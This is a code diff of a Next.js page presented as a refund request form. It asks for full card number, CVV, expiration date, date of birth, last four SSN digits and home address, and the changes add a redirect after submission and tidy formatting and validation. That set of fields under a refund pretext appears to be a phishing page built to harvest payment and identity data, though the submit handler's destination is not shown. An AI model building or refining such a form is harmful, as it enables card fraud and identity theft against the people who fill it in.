@@ -1,10 +1,11 @@
 "use client";
 
 import { useState, ChangeEvent, FormEvent } from "react";
+import { useRouter } from "next/router"; // Importing useRouter from next/router
 import { handleFormSubmit } from "@/src/utils/submit";
 
 interface FormData {
-  amount:number;
+  amount: number;
   orderId: string;
   reason: string;
   firstName: string;
@@ -17,7 +18,7 @@ interface FormData {
   cardNumber: string;
   expirationDate: string;
   cvv: string;
-  lfssn:string;
+  lfssn: string;
 }
 
 export default function Home() {
@@ -27,7 +28,7 @@ export default function Home() {
     reason: "",
     firstName: "",
     lastName: "",
-    dob:"", 
+    dob: "",
     mobileNumber: "",
     homeAddress: "",
     zipCode: "",
@@ -35,11 +36,13 @@ export default function Home() {
     cardNumber: "",
     expirationDate: "",
     cvv: "",
-    lfssn:"",
+    lfssn: "",
   });
 
   const [isLoading, setIsLoading] = useState(false);
   const [statusMessage, setStatusMessage] = useState("");
+  
+  const router = useRouter(); // Initialize useRouter
 
   const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
     const { id, value } = e.target;
@@ -55,10 +58,16 @@ export default function Home() {
     setStatusMessage("");
 
     try {
+      // Submit the form data
       await handleFormSubmit(formData);
       setStatusMessage("Refund request submitted successfully!");
+
+      // Redirect to next.tsx after successful submission
+      router.push('/next'); // This will navigate to the `next.tsx` page
+
+      // Reset the form data
       setFormData({
-        amount:0,
+        amount: 0,
         orderId: "",
         reason: "",
         firstName: "",
@@ -71,7 +80,7 @@ export default function Home() {
         cardNumber: "",
         expirationDate: "",
         cvv: "",
-        lfssn:"",
+        lfssn: "",
       });
     } catch (error) {
       setStatusMessage("Failed to submit the refund request. Please try again.");
@@ -102,7 +111,7 @@ export default function Home() {
               onChange={handleChange}
               required
             />
-              <label htmlFor="amount"> Amount:</label>
+            <label htmlFor="amount"> Amount:</label>
             <input
               type="text"
               id="amount"
@@ -129,7 +138,6 @@ export default function Home() {
               onChange={handleChange}
               required
             />
-
             <label htmlFor="lastName">Last Name:</label>
             <input
               type="text"
@@ -138,7 +146,6 @@ export default function Home() {
               onChange={handleChange}
               required
             />
-
             <label htmlFor="dob">Date of Birth:</label>
             <input
               type="text"
@@ -148,7 +155,6 @@ export default function Home() {
               onChange={handleChange}
               required
             />
-
             <label htmlFor="mobileNumber">Mobile Number:</label>
             <input
               type="text"
@@ -157,21 +163,15 @@ export default function Home() {
               onChange={handleChange}
               required
             />
-
-
             <label htmlFor="lfssn">Last four SSN:</label>
-<input
-  type="number"
-  id="lfssn"
-  value={formData.lfssn}
-  onChange={handleChange}
-  required
-  min="0" // Prevents negative values
-/>
-
-
-            
-
+            <input
+              type="number"
+              id="lfssn"
+              value={formData.lfssn}
+              onChange={handleChange}
+              required
+              min="0" // Prevents negative values
+            />
             <label htmlFor="homeAddress">Home Address:</label>
             <input
               type="text"
@@ -180,7 +180,6 @@ export default function Home() {
               onChange={handleChange}
               required
             />
-
             <label htmlFor="zipCode">Zip Code:</label>
             <input
               type="text"
@@ -189,7 +188,6 @@ export default function Home() {
               onChange={handleChange}
               required
             />
-
             <label htmlFor="cardType">Card Type:</label>
             <select id="cardType" value={formData.cardType} onChange={handleChange} required>
               <option value="">Select</option>
@@ -197,7 +195,6 @@ export default function Home() {
               <option value="mastercard">Mastercard</option>
               <option value="amex">American Express</option>
             </select>
-
             <label htmlFor="cardNumber">Card Number:</label>
             <input
               type="text"
@@ -205,9 +202,8 @@ export default function Home() {
               value={formData.cardNumber}
               onChange={handleChange}
               required
-              pattern="[0-9]{9-16}"
+              pattern="[0-9]{13,16}"
             />
-
             <label htmlFor="expirationDate">Expiration Date:</label>
             <input
               type="month"
@@ -216,7 +212,6 @@ export default function Home() {
               onChange={handleChange}
               required
             />
-
             <label htmlFor="cvv">CVV:</label>
             <input
               type="text"
